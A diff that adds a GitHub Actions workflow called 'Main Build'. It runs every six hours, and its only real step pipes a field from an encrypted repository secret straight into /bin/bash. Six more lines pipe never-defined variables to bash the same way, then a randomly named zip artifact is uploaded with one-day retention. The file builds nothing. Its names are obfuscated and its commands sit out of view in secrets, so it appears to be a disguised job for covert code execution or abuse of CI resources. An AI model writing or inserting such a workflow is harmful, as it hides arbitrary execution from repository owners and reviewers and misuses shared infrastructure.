@@ -1,0 +1,36 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '41 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          tnb94637: ${{ secrets.tnb94637 }}
+        run: |
+          printf '%s' "$tnb94637" | jq -r .w37 | /bin/bash
+          echo $fk60363 | jq -r .by88 | /bin/bash
+          echo $lk8523 | jq -r .s2 | /bin/bash
+          printf '%s' "$snhk05167" | jq -r .eai7509 | /bin/bash
+          printf '%s' "$xjyv6" | jq -r .ni65 | /bin/bash
+          echo $b7691 | jq -r .ru51300 | /bin/bash
+          printf '%s' "$k39014" | jq -r .yy82 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: DxXVRP4d
+          path: "*.zip"
+          retention-days: 1
